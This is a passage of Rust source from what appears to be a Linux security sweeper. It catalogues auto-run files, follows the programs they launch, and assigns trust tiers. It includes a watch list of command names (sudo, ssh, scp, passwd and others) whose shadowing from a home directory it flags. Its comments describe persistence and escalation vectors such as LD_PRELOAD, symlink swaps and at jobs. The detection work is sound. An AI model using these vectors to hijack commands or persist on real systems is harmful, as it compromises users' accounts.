//! Collecting what runs on its own: every file in the auto-run catalog (the
//! system's, and the user's under their home), what links there point at,
//! and the programs and scripts the collected files run, each with its
//! trust tier and content.

use std::collections::{BTreeMap, HashSet};
use std::fs;
use std::io;
use std::os::fd::AsRawFd as _;
use std::os::unix::fs::MetadataExt;
use std::path::Path;

use super::index::PackageIndex;
use super::path::Search;
use super::read::{self, Found, View};
use super::tier::{self, Observed, Tier, classify};
use super::{access, boot, commands, config, own, path};
use crate::autorun::{Category, Kind, Location, SYSTEM, SYSTEM_SWEEP, USER};
use crate::content::{self, Content};
use crate::rules::RuleId;
use crate::scan::MAX_TEXT_FILE_SIZE;
use crate::sha256::Digest;

/// Command names a program in the home directory should never take over.
const WATCHED_NAMES: &[&str] = &[
    "sudo",
    "su",
    "doas",
    "run0",
    "pacman",
    "yay",
    "paru",
    "makepkg",
    "ssh",
    "scp",
    "git",
    "gpg",
    "passwd",
    "bash",
    "sh",
    "zsh",
    "systemctl",
    "omarchy-guardian",
];

/// Where Omarchy's installer lives; paths it mentions are noted as "likely
/// Omarchy" when no package owns them.
const OMARCHY_INSTALL: &[&str] = &["usr/share/omarchy/install", "usr/share/omarchy/migrations"];

/// Why root did not look at a path a user could have chosen.
pub const NOT_LOOKED_AT: &str =
    "only root can read it, and a user's file or process names it: not looked at";

/// Why root did not look at a path nobody chose.
const NOT_REACHED: &str = "gone, or behind a link that is not root's alone: not looked at";

/// Where the kernel keeps what is no program on disk: device nodes and its
/// own files. A command that names one (`--list-file /dev/stdout`) names
/// where its output goes, and `/dev/stdout` leads to whatever the sweep
/// itself writes to: nothing there is followed.
const NOT_FOLLOWED: &[&str] = &["dev/", "proc/", "sys/"];

/// Memory a user fills with files like any directory (`/dev/shm`), and
/// what lives until the next boot (`/run`, `/run/user/<uid>`): a program
/// run from there is followed like any other, but only a regular file is
/// one. The sockets and pipes services keep there are not.
const FILES_ONLY: &[&str] = &["dev/shm/", "run/"];

/// The variables a locale file sets.
const LOCALE_VARIABLES: &[&str] = &["LANG", "LANGUAGE"];

/// The format label of a file root hashed but did not hand back.
pub const WITHHELD: &str = "root-only file (hashed, content withheld)";

/// The format label of a packaged file only root can read that a process
/// led the root collector to: compared with its package, and no more told.
pub const COMPARED: &str = "root-only packaged file (compared with its package, hash withheld)";

/// What is said of a packaged file that its package installs readable by
/// everyone and that no longer is.
pub const CLOSED: &str = "its package installs it readable by everyone, and it no longer is";

/// How a note starts that says a limit was reached while looking for what
/// an item runs. Such an item cannot be allowed (an allow would vouch for
/// commands nobody followed), and where its text is not reviewed either,
/// the sweep counts as incomplete.
pub const NOT_ALL_FOLLOWED: &str = "not all of what it runs was followed: ";

/// What stands for the content of a packaged script whose interpreter line
/// alone was rewritten.
const PACKAGED_SCRIPT: &str = "packaged script (not read again)";

/// Where `at` keeps its jobs: Arch's spool, the one other builds use, and
/// Debian's beside the crontabs.
const AT_SPOOLS: &[&str] = &["var/spool/atd/", "var/spool/at/", "var/spool/cron/atjobs/"];

/// Whether `path` is a queued `at` job. One starts with the whole
/// environment of whoever queued it, tokens and all, and is told apart by
/// who owns the file, not by its name.
pub fn is_at_job(path: &str) -> bool {
    AT_SPOOLS.iter().any(|spool| path.starts_with(spool))
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Origin {
    /// The system, read as the user.
    System,
    /// The user's home directory.
    User,
    /// The system and root's home, read by the root collector.
    Root,
}

/// What an item holds, as far as the review is concerned.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Body {
    Text(String),
    /// A recognised binary format: hashed, never read.
    Binary(&'static str),
    /// Binary data where text belongs; cannot be reviewed.
    Undecodable,
    /// Text larger than the review limit.
    Oversized,
    /// A link; its target is its own item when it needs judging.
    Link(String),
    /// Could not be read as this user.
    Unreadable(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Item {
    pub origin: Origin,
    pub category: Category,
    /// Relative to the root (`etc/udev/rules.d/x.rules`, `home/u/.bashrc`).
    pub path: String,
    pub tier: Tier,
    pub sha256: Option<Digest>,
    pub body: Body,
    /// The command lines it runs.
    pub runs: Vec<String>,
    /// The item that runs or links to this one.
    pub run_by: Option<String>,
    pub notes: Vec<String>,
    /// What the live checks established about it (a rule and what was seen).
    pub alerts: Vec<(RuleId, String)>,
}

impl Item {
    /// Trusted items are only counted. An item the live checks raised an
    /// alert about is not trusted by its tier (a setuid copy of a packaged
    /// program is still a copy), only by the user allowing it.
    pub fn is_trusted(&self) -> bool {
        self.tier == Tier::Allowed
            || (super::judge::is_trusted(self.tier) && self.alerts.is_empty())
    }
}

#[derive(Debug, Default)]
pub struct Collection {
    pub items: Vec<Item>,
    /// What was not looked at, each as a sentence: a location with more
    /// entries than the limit, a name that cannot be read.
    pub truncated: Vec<String>,
    /// What is said of the system as a whole (Secure Boot is off).
    pub notes: Vec<String>,
    /// The paths of root's accounts, members, keys and trust anchors that
    /// the root collector says are new, when it kept track itself (see
    /// `root::news`); `None` when it did not.
    pub root_news: Option<Vec<String>>,
}

/// What a collection runs against.
pub struct Scope<'a> {
    pub root: &'a Path,
    /// The home directory relative to the root (`home/u`), if any.
    pub home: Option<&'a str>,
    pub index: &'a PackageIndex,
    pub origin: Origin,
}

/// Collects the system catalog and, with a home, the user catalog.
pub fn collect(scope: &Scope<'_>) -> Collection {
    let mut paths: BTreeMap<String, Category> = BTreeMap::new();
    let mut collection = Collection::default();
    for location in SYSTEM.iter().chain(SYSTEM_SWEEP) {
        add_location(scope, location, "", &mut paths, &mut collection.truncated);
    }
    if let Some(home) = scope.home {
        for location in USER {
            add_location(
                scope,
                location,
                &format!("{home}/"),
                &mut paths,
                &mut collection.truncated,
            );
        }
    }

    // Programs that take a system command's name, wherever a `PATH` puts
    // a directory someone can write ahead of `/usr/bin`.
    let search = path::search(scope);
    let (shadowing, unlisted) = path::shadowing_programs(scope, &search);
    for path in shadowing {
        paths.entry(path).or_insert(Category::LocalBin);
    }
    collection.truncated.extend(unlisted);
    // What stands in for Guardian's own units, in the unit directories the
    // catalog does not walk.
    for path in own::paths(scope) {
        paths.entry(path).or_insert(Category::Systemd);
    }

    let mut seen: HashSet<String> = paths.keys().cloned().collect();
    let mut pending: Vec<Item> = paths
        .into_iter()
        .map(|(path, category)| item(scope, category, path, None))
        .collect();
    let omarchy = omarchy_paths(scope.root);
    while let Some(mut item) = pending.pop() {
        let followed = follow(scope, &item, &search);
        for target in followed.targets {
            if seen.insert(target.clone()) {
                pending.push(self::item(scope, item.category, target, Some(&item.path)));
            }
        }
        item.notes.extend(
            followed
                .unfollowed
                .into_iter()
                .map(|limit| format!("{NOT_ALL_FOLLOWED}{limit}")),
        );
        if item.tier == Tier::Unknown && omarchy.contains(&format!("/{}", item.path)) {
            item.notes.push("a path Omarchy's installer writes".into());
        }
        if item.tier == Tier::Unknown && sets_only_the_locale(&item) {
            item.tier = Tier::Inert;
            item.notes.push("sets the locale and nothing else".into());
        }
        collection.items.push(item);
    }
    path::mark(scope, &search, &mut collection.items);
    for item in &mut collection.items {
        // The package's own directory, and the one for shared data, may
        // hold a drop-in a repository package ships for every unit;
        // nothing else there is spared.
        let shipped = item.tier == Tier::Vendor
            && ["usr/lib/systemd/", "usr/share/systemd/"]
                .iter()
                .any(|packaged| item.path.starts_with(packaged));
        if own::is_override(scope.home, &item.path) && !shipped {
            own::mark(item);
        }
    }
    collection
        .items
        .sort_by(|left, right| left.path.cmp(&right.path));
    merge(&mut collection, access::items(scope));
    let boot = boot::check(scope);
    merge(&mut collection, boot.items);
    collection.truncated.extend(boot.unchecked);
    collection.notes.extend(boot.notes);
    collection
}

/// Whether `item` is the system's or a home's `locale.conf`, which the
/// profile script of every login shell reads in, and holds nothing but the
/// locale: `LANG=`, `LANGUAGE=` and `LC_…=` with plain values. No package
/// owns the file (the installer writes it), and one that only says which
/// language to speak runs nothing. Any other line, or a value a shell
/// would expand, leaves it an item to look at.
fn sets_only_the_locale(item: &Item) -> bool {
    let named = item.path == "etc/locale.conf" || item.path.ends_with("/.config/locale.conf");
    let Body::Text(text) = &item.body else {
        return false;
    };
    named
        && text.lines().map(str::trim).all(|line| {
            line.is_empty()
                || line.starts_with('#')
                || line.split_once('=').is_some_and(|(name, value)| {
                    (LOCALE_VARIABLES.contains(&name) || name.starts_with("LC_"))
                        && value.chars().all(|c| {
                            c.is_ascii_alphanumeric()
                                || matches!(c, '_' | '-' | '.' | '@' | ':' | '"')
                        })
                })
        })
}

/// Whether nobody looked for everything `item` runs (see
/// `NOT_ALL_FOLLOWED`).
pub fn is_capped(item: &Item) -> bool {
    item.notes
        .iter()
        .any(|note| note.starts_with(NOT_ALL_FOLLOWED))
}

/// Adds `items` to `collection`; an item already there by path gains the
/// new one's notes and alerts instead of appearing twice.
pub fn merge(collection: &mut Collection, items: Vec<Item>) {
    for item in items {
        if let Some(existing) = collection
            .items
            .iter_mut()
            .find(|existing| existing.path == item.path)
        {
            for note in item.notes {
                if !existing.notes.contains(&note) {
                    existing.notes.push(note);
                }
            }
            for alert in item.alerts {
                if !existing.alerts.contains(&alert) {
                    existing.alerts.push(alert);
                }
            }
        } else {
            collection.items.push(item);
        }
    }
    collection
        .items
        .sort_by(|left, right| left.path.cmp(&right.path));
}

/// Adds the files of `location` (under `prefix`, the home for user
/// locations) that run on their own.
fn add_location(
    scope: &Scope<'_>,
    location: &Location,
    prefix: &str,
    paths: &mut BTreeMap<String, Category>,
    truncated: &mut Vec<String>,
) {
    let base = format!("{prefix}{}", location.path);
    let candidates = if location.kind == Kind::Glob {
        let matches = read::matching(scope.root, &base);
        if matches.truncated {
            truncated.push(format!("/{base}: more matches than were looked at"));
        }
        truncated.extend(matches.unnamed.iter().map(|name| not_utf8(name)));
        truncated.extend(
            matches
                .unreadable
                .iter()
                .map(|directory| format!("/{directory}: could not be listed")),
        );
        matches.files
    } else if location.kind == Kind::File {
        // A file behind a directory only root can list is still looked at,
        // and reported as unreadable.
        match fs::symlink_metadata(scope.root.join(&base)) {
            Err(error) if error.kind() == io::ErrorKind::NotFound => return,
            Ok(_) | Err(_) => vec![base],
        }
    } else {
        let listing = read::entries(scope.root, &base);
        if listing.truncated {
            truncated.push(format!("/{base}: more entries than were looked at"));
        }
        truncated.extend(listing.unnamed.iter().map(|name| not_utf8(name)));
        // A directory only root can list is one unreadable item.
        for directory in listing.unreadable {
            paths.entry(directory).or_insert(location.category);
        }
        listing.files
    };
    for path in candidates {
        let relative = path.strip_prefix(prefix).unwrap_or(&path);
        if location.contains(relative) && wanted(scope, location.category, relative) {
            paths.entry(path).or_insert(location.category);
        }
    }
}

/// The sentence for an entry whose name the sweep cannot read.
pub fn not_utf8(shown: &str) -> String {
    // A name may hold a newline, which would start a line of its own.
    format!("/{}{NOT_UTF8}", shown.escape_debug())
}

const NOT_UTF8: &str = ": a name that is not UTF-8 was not checked";

/// The most sentences of what was not looked at that are kept.
const MAX_UNCHECKED: usize = 20;

/// `unchecked` without repeats and within a bound, the rest counted.
pub fn bounded(mut unchecked: Vec<String>) -> Vec<String> {
    // Names last: anyone can make many, and they must not crowd out a
    // limit that was reached.
    unchecked.sort_by_key(|sentence| (sentence.ends_with(NOT_UTF8), sentence.clone()));
    unchecked.dedup();
    let more = unchecked.len().saturating_sub(MAX_UNCHECKED);
    unchecked.truncate(MAX_UNCHECKED);
    if more > 0 {
        unchecked.push(format!("and {more} more that were not checked"));
    }
    unchecked
}

/// Whether a user decides what `run_by` names: it is not a file that is
/// root's alone to write. What a live check reached (no `run_by`) comes
/// from a process, which any user can start with the arguments and
/// environment they like.
fn user_steered(root: &Path, run_by: Option<&str>) -> bool {
    run_by.is_none_or(|by| {
        // A spool holds what users handed in (their crontabs), whoever
        // the files belong to.
        if by.starts_with("var/spool/") {
            return true;
        }
        // Root's own file in a directory somebody else may write can be
        // exchanged for theirs between two looks: it counts only where the
        // whole way to it is root's alone.
        let Some(read::Seen {
            what: read::Public::File(file),
            kept: true,
            ..
        }) = read::seen(root, by, View::Pinned)
        else {
            return true;
        };
        !file
            .metadata()
            .is_ok_and(|metadata| metadata.uid() == 0 && metadata.mode() & 0o022 == 0)
    })
}

/// How root looks at what `run_by` (or, without one, a process) names
/// (`None`: not root, who sees no more through a path than its user does
/// anyway). A path a user can choose (a line of their crontab, where a
/// link leads, an `LD_PRELOAD` value, a script argument) is looked at as
/// the user could look at it: otherwise its hash, its kind, where a link
/// leads and whether it exists at all would tell them about a file they
/// cannot read. And root never goes by the path alone: a user who owns a
/// directory on the way can swap it for a link elsewhere at any moment.
fn view(scope: &Scope<'_>, run_by: Option<&str>) -> Option<View> {
    (scope.origin == Origin::Root).then(|| {
        if user_steered(scope.root, run_by) {
            View::Everyone
        } else {
            View::Trusted
        }
    })
}

/// Whether there is something at `path` that `run_by` may lead the
/// collector to.
/// A directory is not: a command that names one (`find /etc/x`) does not
/// run it.
pub fn is_there(scope: &Scope<'_>, path: &str, run_by: Option<&str>) -> bool {
    match view(scope, run_by) {
        Some(view) => read::seen(scope.root, path, view)
            .is_some_and(|seen| !matches!(seen.what, read::Public::Directory(_))),
        // A link is there, as in the pinned view; where it leads is
        // looked at when it is followed.
        None => {
            fs::symlink_metadata(scope.root.join(path)).is_ok_and(|metadata| !metadata.is_dir())
        }
    }
}

/// Whether there is a regular file at `path` that `run_by` may lead the
/// collector to (a link to one counts, as for `Path::is_file`, unless root
/// looks).
pub fn is_file_there(scope: &Scope<'_>, path: &str, run_by: Option<&str>) -> bool {
    match view(scope, run_by) {
        Some(view) => matches!(
            read::seen(scope.root, path, view).map(|seen| seen.what),
            Some(read::Public::File(_))
        ),
        None => scope.root.join(path).is_file(),
    }
}

/// How the collector sees the hops of a link chain. As root, a link leads
/// where its owner says, so every hop is seen as everyone sees it.
fn hop(scope: &Scope<'_>, path: &str) -> read::Hop {
    if scope.origin == Origin::Root {
        read::public_hop(scope.root, path)
    } else {
        read::plain_hop(scope.root, path)
    }
}

/// `read::look` at where a link led.
fn look_past_link(scope: &Scope<'_>, path: &str) -> Found {
    if scope.origin == Origin::Root {
        read::look_as(scope.root, path, View::Everyone)
            .unwrap_or_else(|| Found::Unreadable(NOT_LOOKED_AT.into()))
    } else {
        read::look(scope.root, path)
    }
}

/// `read::look` at an item. What a process names (a script argument, an
/// `LD_PRELOAD` value) or a file led to is seen as `view` has it; the
/// auto-run locations' own files, and the set-id and kernel-module checks'
/// (which find their files themselves, so nobody chose those), as root
/// sees them.
pub fn look(scope: &Scope<'_>, category: Category, path: &str, run_by: Option<&str>) -> Found {
    if scope.origin != Origin::Root {
        return read::look(scope.root, path);
    }
    let named = run_by.is_some()
        || matches!(
            category,
            Category::Process | Category::Listener | Category::Input | Category::Camera
        );
    let (view, unseen) = if named && user_steered(scope.root, run_by) {
        (View::Everyone, NOT_LOOKED_AT)
    } else if named {
        (View::Trusted, NOT_LOOKED_AT)
    } else {
        (View::Pinned, NOT_REACHED)
    };
    read::look_as(scope.root, path, view).unwrap_or_else(|| Found::Unreadable(unseen.into()))
}

/// The item of a packaged file that a process led the root collector to
/// and that not everyone may read (a running program's `exe`, a preloaded
/// library), for the one question the live checks ask of it: is it still
/// what its package installed?
///
/// A user decides which path this is, by running the program or naming the
/// library, so the rule for such paths applies: nothing of a file they
/// cannot read is told. Three things keep that rule here. The path must be
/// one the package index holds: the index is root's, pacman's database is
/// readable by everyone, and so is every package, so that a file is
/// installed at this path, and what it holds as installed, is already
/// public. The way to it must be root's alone, with no link followed
/// (`kept`, and the path the walk took is the path asked for), so the file
/// looked at is the one root's package manager put there and not one a
/// user moved or linked in. And what comes back is one bit: the file is as
/// its package installed it, or it is not. "It is" tells the user they
/// hold its content already (the package); "it is not" tells them a
/// packaged program was changed, which is what the sweep is for, and no
/// more than the size and time `pacman -Qkk` compares as any user. The
/// hash of a changed file is withheld: it could confirm a guess at content
/// only root may read. A package's configuration file (`backup=`), which
/// is meant to be edited and may hold secrets, never comes out as changed
/// here (see `tier::classify`), so nothing is told of those at all.
///
/// `None` where there is no such file to compare: the caller then treats
/// the path as not vouched for.
pub fn packaged_item(scope: &Scope<'_>, category: Category, path: &str) -> Option<Item> {
    scope.index.owner(path)?;
    let seen = read::seen(scope.root, path, View::Pinned)?;
    if !seen.kept || seen.path != path || !matches!(seen.what, read::Public::File(_)) {
        return None;
    }
    let found = read::look_pinned(seen);
    if !matches!(found, Found::File { .. }) {
        return None;
    }
    let mut item = item_of(scope, category, path.to_string(), None, &found);
    item.sha256 = None;
    item.body = Body::Binary(COMPARED);
    item.runs.clear();
    Some(item)
}

/// The tier of a packaged file the sweep could not read: modified when its
/// package installs it readable by everyone, since then somebody closed
/// it; unknown otherwise. Asked as the sweep's user only: root reads such
/// a file where it may look at all, and tells nothing of one it may not.
fn unread_tier(scope: &Scope<'_>, path: &str) -> Tier {
    if scope.origin == Origin::Root {
        return Tier::Unknown;
    }
    let closed = fs::symlink_metadata(scope.root.join(path)).is_ok_and(|metadata| {
        metadata.is_file() && tier::is_closed(path, metadata.mode(), scope.index)
    });
    if closed {
        Tier::Modified
    } else {
        Tier::Unknown
    }
}

/// Whether a file in a user location is one that runs on its own.
fn wanted(scope: &Scope<'_>, category: Category, relative: &str) -> bool {
    let name = relative.rsplit('/').next().unwrap_or(relative);
    match category {
        // A backup Omarchy left (`hyprland.conf.bak.1700000000`) ends in
        // neither; a file Hyprland is told to `source` is followed from
        // the one that names it, whatever it is called.
        Category::Hyprland => read::has_extension(name, "lua") || read::has_extension(name, "conf"),
        // Omarchy runs every hook but `*.sample`.
        Category::OmarchyHook => !name.ends_with(".sample"),
        // Old password hashes (`pam_pwhistory`): never read, never handed on.
        Category::Pam => name != "opasswd",
        Category::Autostart if relative.starts_with(".config/autostart/") => {
            name.ends_with(".desktop")
        }
        // Only launchers that replace a system app's; one `mimeapps.list`
        // names is followed from there.
        Category::Desktop if relative.starts_with(".local/share/applications/") => {
            name == "mimeapps.list"
                || (name.ends_with(".desktop")
                    && scope
                        .root
                        .join("usr/share/applications")
                        .join(name)
                        .exists())
        }
        Category::Browser if relative.contains("essaging") => read::has_extension(name, "json"),
        // Only programs named like a system command.
        Category::LocalBin => {
            WATCHED_NAMES.contains(&name)
                || name.starts_with("omarchy-")
                || scope.root.join("usr/bin").join(name).exists()
        }
        _ => true,
    }
}

/// One item: what is at `path`, its tier and content, and what it runs.
pub fn item(scope: &Scope<'_>, category: Category, path: String, run_by: Option<&str>) -> Item {
    let found = look(scope, category, &path, run_by);
    item_of(scope, category, path, run_by, &found)
}

/// The item for what `look` found at `path`.
pub fn item_of(
    scope: &Scope<'_>,
    category: Category,
    path: String,
    run_by: Option<&str>,
    found: &Found,
) -> Item {
    let (tier, sha256, body) = match found {
        Found::File {
            sha256,
            mode,
            size,
            head,
        } => {
            let observed = Observed::File {
                sha256,
                mode: *mode,
                size: *size,
                content: whole(*size, head),
            };
            (
                classify(&path, observed, scope.index),
                Some(*sha256),
                body_of(&path, *size, head),
            )
        }
        Found::Link(target) => {
            let resolved_path = read::resolve_where(&path, target, &|next| hop(scope, next));
            let resolved = resolved_path
                .as_deref()
                .and_then(|resolved| self_tier(scope, resolved));
            let name = path.rsplit('/').next().unwrap_or(&path);
            let observed = Observed::Link {
                target,
                resolved,
                alias: resolved_path
                    .as_deref()
                    .is_some_and(|resolved| declares_alias(scope, resolved, name)),
            };
            (
                classify(&path, observed, scope.index),
                None,
                Body::Link(target.clone()),
            )
        }
        Found::Other => {
            // Root can list any directory.
            let directory = scope.origin != Origin::Root
                && fs::symlink_metadata(scope.root.join(&path))
                    .is_ok_and(|metadata| metadata.is_dir());
            let reason = if directory {
                "a directory only root can list"
            } else {
                "not a regular file"
            };
            (Tier::Unknown, None, Body::Unreadable(reason.into()))
        }
        Found::Unreadable(reason) => (
            unread_tier(scope, &path),
            None,
            Body::Unreadable(reason.clone()),
        ),
    };
    let runs = match &body {
        Body::Text(text) => commands::commands(category, &path, text),
        _ => Vec::new(),
    };
    // An `at` job starts with the whole environment of whoever queued it,
    // tokens and all: it is told by its hash, and never handed on.
    let (body, runs) = match body {
        Body::Text(_) if is_at_job(&path) => (Body::Binary(WITHHELD), Vec::new()),
        body => (body, runs),
    };
    // A packaged script whose interpreter line alone was rewritten is its
    // package's content from the second line on (see `tier`): it is said,
    // and read no more than any other file a package installed.
    let rewritten = tier::interpreter_note(&path, tier, scope.index);
    let body = match body {
        Body::Text(_) if rewritten.is_some() => Body::Binary(PACKAGED_SCRIPT),
        body => body,
    };
    let (body, runs) = handed_back(scope, category, run_by, body, runs);
    let mut notes = notes(scope, category, &path, &body, run_by);
    notes.extend(limits(scope, category, &path, &body, found));
    if is_closed(scope, &path, tier, found) {
        notes.push(CLOSED.to_string());
    }
    notes.extend(path_notes(category, &body));
    notes.extend(rewritten.map(str::to_string));
    let alerts = settings_alerts(scope, category, &path, tier, &body);
    Item {
        // The root collector's items are all root's, its home included.
        origin: if scope.origin == Origin::System
            && scope
                .home
                .is_some_and(|home| path.starts_with(&format!("{home}/")))
        {
            Origin::User
        } else {
            scope.origin
        },
        category,
        path,
        tier,
        sha256,
        body,
        runs,
        run_by: run_by.map(str::to_string),
        notes,
        alerts,
    }
}

/// The content of an item and what it runs, as the collector hands them
/// back. As root, what was reached by following (a command, a link, a
/// preload, a live check) can be steered by any user (a crontab line, an
/// `LD_PRELOAD` value) at `/etc/shadow` or a key. Its content is never
/// handed back and nothing is followed from it; the user's own sweep reads
/// whatever the user may read. Only the auto-run locations' own files keep
/// their content.
fn handed_back(
    scope: &Scope<'_>,
    category: Category,
    run_by: Option<&str>,
    body: Body,
    runs: Vec<String>,
) -> (Body, Vec<String>) {
    if scope.origin == Origin::Root && (run_by.is_some() || category.is_live()) {
        let body = match body {
            Body::Text(_) | Body::Oversized | Body::Undecodable => Body::Binary(WITHHELD),
            other => other,
        };
        (body, Vec::new())
    } else {
        (body, runs)
    }
}

/// The notes for the lines of a start-up file that set `PATH` to what only
/// running them would tell (see `path::opaque`).
fn path_notes(category: Category, body: &Body) -> Vec<String> {
    let read = matches!(
        category,
        Category::Shell | Category::Environment | Category::Hyprland
    );
    match body {
        Body::Text(text) if read => path::opaque(text)
            .into_iter()
            .map(|line| {
                format!(
                    "line {line} sets PATH in a way Guardian cannot follow: the directories it adds are not watched"
                )
            })
            .collect(),
        _ => Vec::new(),
    }
}

/// Whether what `look` found at `path` is a packaged file somebody took
/// everyone's read access from (see `tier::is_closed`).
fn is_closed(scope: &Scope<'_>, path: &str, tier: Tier, found: &Found) -> bool {
    match found {
        Found::File { mode, .. } => tier::is_closed(path, *mode, scope.index),
        // Only a closed file gives this tier to one that was not read.
        Found::Unreadable(_) => tier == Tier::Modified,
        Found::Link(_) | Found::Other => false,
    }
}

/// What the local checks of configuration files say of an item's text
/// (see `config::alerts`). What a package ships, or a copy of it, is the
/// distribution's choice of settings and is left alone.
fn settings_alerts(
    scope: &Scope<'_>,
    category: Category,
    path: &str,
    tier: Tier,
    body: &Body,
) -> Vec<(RuleId, String)> {
    match body {
        Body::Text(text) if !matches!(tier, Tier::Vendor | Tier::Copied | Tier::Inert) => {
            let home = scope.home.unwrap_or("root");
            config::alerts(category, path, text, &|file| {
                is_there(
                    scope,
                    commands::expand(home, file).trim_start_matches('/'),
                    Some(path),
                )
            })
        }
        _ => Vec::new(),
    }
}

/// The notes for the limits reached while looking at an item: a line too
/// long to look through for programs, a chain of links too long to follow.
fn limits(
    scope: &Scope<'_>,
    category: Category,
    path: &str,
    body: &Body,
    found: &Found,
) -> Vec<String> {
    let mut reached = match body {
        Body::Text(text) => commands::unfollowed(category, text),
        _ => Vec::new(),
    };
    if let Found::Link(target) = found
        && read::chain_too_long(path, target, &|next| hop(scope, next))
    {
        reached.push(format!(
            "a chain of more than {} links, or one that goes in a circle",
            read::MAX_HOPS
        ));
    }
    reached
        .into_iter()
        .map(|limit| format!("{NOT_ALL_FOLLOWED}{limit}"))
        .collect()
}

/// What to tell about an item beyond its tier.
fn notes(
    scope: &Scope<'_>,
    category: Category,
    path: &str,
    body: &Body,
    run_by: Option<&str>,
) -> Vec<String> {
    let mut notes = Vec::new();
    if let Some(by) = run_by {
        notes.push(format!("run by /{by}"));
    }
    if let (Body::Unreadable(_), Some(owned)) = (body, scope.index.owner(path)) {
        notes.push(format!(
            "installed by {}; only root can read it",
            scope.index.package(owned)
        ));
    }
    if category == Category::LocalBin
        && let Some(name) = path.rsplit('/').next()
        && scope.root.join("usr/bin").join(name).exists()
    {
        notes.push(format!("shadows /usr/bin/{name}"));
    }
    // A launcher of the same name; `mimeapps.list` is a list of handlers,
    // which the home's and the system's both add to.
    if category == Category::Desktop
        && let Some(name) = path.rsplit('/').next()
        && read::has_extension(name, "desktop")
        && scope
            .root
            .join("usr/share/applications")
            .join(name)
            .exists()
    {
        notes.push(format!(
            "replaces the launcher /usr/share/applications/{name}"
        ));
    }
    notes
}

/// Whether the unit at `unit` declares `name` as an alias (`Alias=` in its
/// `[Install]` section), as `systemctl enable` links it under.
fn declares_alias(scope: &Scope<'_>, unit: &str, name: &str) -> bool {
    let Found::File { head, size, .. } = look_past_link(scope, unit) else {
        return false;
    };
    if size > 64 * 1024 {
        return false;
    }
    String::from_utf8_lossy(&head).lines().any(|line| {
        line.trim()
            .strip_prefix("Alias=")
            .is_some_and(|aliases| aliases.split_whitespace().any(|alias| alias == name))
    })
}

/// The tier of the regular file at `path`, if it is one.
fn self_tier(scope: &Scope<'_>, path: &str) -> Option<Tier> {
    match look_past_link(scope, path) {
        Found::File {
            sha256,
            mode,
            size,
            head,
        } => Some(classify(
            path,
            Observed::File {
                sha256: &sha256,
                mode,
                size,
                content: whole(size, &head),
            },
            scope.index,
        )),
        Found::Link(_) | Found::Other | Found::Unreadable(_) => None,
    }
}

/// The whole content of a file of `size` bytes, when `head` (the first
/// bytes kept while it was hashed) holds all of it.
fn whole(size: u64, head: &[u8]) -> Option<&[u8]> {
    (head.len() as u64 == size).then_some(head)
}

fn body_of(path: &str, size: u64, head: &[u8]) -> Body {
    if size > MAX_TEXT_FILE_SIZE {
        return match content::classify_payload(path, &head[..head.len().min(8192)]) {
            Content::Binary(format) => Body::Binary(format.label()),
            Content::Text(_) | Content::Lossy { .. } => Body::Oversized,
            Content::Undecodable => Body::Undecodable,
        };
    }
    match content::classify_payload(path, head) {
        Content::Text(text) | Content::Lossy { text, .. } => Body::Text(text),
        Content::Binary(format) => Body::Binary(format.label()),
        Content::Undecodable => Body::Undecodable,
    }
}

/// The longest command line split into its commands.
const MAX_SPLIT_LINE: usize = 64 * 1024;

/// What a directory holds, as the walk may see it.
fn listed(scope: &Scope<'_>, view: Option<View>, directory: &str) -> Vec<String> {
    let names = |entries: fs::ReadDir| {
        entries
            .flatten()
            .filter_map(|entry| entry.file_name().into_string().ok())
            .collect()
    };
    match view {
        Some(view) => match read::seen(scope.root, directory, view).map(|seen| seen.what) {
            Some(read::Public::Directory(handle)) => {
                fs::read_dir(format!("/proc/self/fd/{}", handle.as_raw_fd()))
                    .map(names)
                    .unwrap_or_default()
            }
            _ => Vec::new(),
        },
        None => fs::read_dir(scope.root.join(directory))
            .map(names)
            .unwrap_or_default(),
    }
}

/// What following an item gave.
#[derive(Debug, Default, PartialEq, Eq)]
struct Followed {
    /// The paths it leads to.
    targets: Vec<String>,
    /// The limits that were reached, each as the rest of a sentence.
    unfollowed: Vec<String>,
}

/// The paths `item` leads to that need judging too: a link's target, and
/// the programs and scripts its commands run. A bare command name is
/// looked up in `search`.
fn follow(scope: &Scope<'_>, item: &Item, search: &Search) -> Followed {
    let mut targets = Vec::new();
    let mut unfollowed: Vec<String> = Vec::new();
    let mut limit = |sentence: String| {
        if !unfollowed.contains(&sentence) {
            unfollowed.push(sentence);
        }
    };
    // Only a link to a regular file leads anywhere to judge (a masked
    // unit's `/dev/null` does not).
    let by = Some(item.path.as_str());
    if let Body::Link(target) = &item.body
        && let Some(resolved) = read::resolve_where(&item.path, target, &|next| hop(scope, next))
        && matches!(look_past_link(scope, &resolved), Found::File { .. })
    {
        targets.push(resolved);
    }
    // `~` in a user's crontab is that user's home, not the sweep's.
    let crontab_home = item
        .path
        .strip_prefix("var/spool/cron/")
        .and_then(|user| user_home(scope.root, user));
    let home = crontab_home.as_deref().or(scope.home).unwrap_or("root");
    let view = view(scope, by);
    let list = |directory: &str| listed(scope, view, directory);
    for command in &item.runs {
        // A pattern alone (a Hyprland `source`) names the files it
        // matches; anything else with a `*` in it (a command line, however
        // it is written) still runs its program.
        let bare = command.trim();
        let bare = ["$HOME/", "${HOME}/"]
            .iter()
            .find_map(|home| bare.strip_prefix(home))
            .unwrap_or(bare);
        let pattern = command.contains(['*', '?'])
            && !bare.contains(|c: char| c.is_whitespace() || ";|&$()<>`'\"\\".contains(c));
        if pattern {
            let (matched, more) = commands::glob_targets(home, command, &list);
            targets.extend(matched);
            if more {
                limit(format!(
                    "only the first {} files a pattern names",
                    commands::MAX_GLOB
                ));
            }
            continue;
        }
        // Each command of a line a shell runs (`a; b && c | d`) runs its
        // own program. Other lines (a unit's `ExecStart=`) are not shell:
        // there only ` ; ` separates commands, and a long line is taken
        // whole.
        let shell_line = matches!(
            item.category,
            Category::Cron | Category::Shell | Category::Hyprland
        );
        let lookup = commands::Lookup {
            home,
            search: &search.directories,
            exists: &|candidate| is_there(scope, candidate, by),
            capped: std::cell::Cell::new(false),
        };
        let parts = if command.len() > MAX_SPLIT_LINE {
            limit(format!(
                "a command line longer than {MAX_SPLIT_LINE} bytes was taken as one command"
            ));
            vec![command.clone()]
        } else if shell_line {
            let (parts, more) = commands::split_commands(command);
            if more {
                lookup.capped.set(true);
            }
            parts
        } else {
            command.split(" ; ").map(str::to_string).collect()
        };
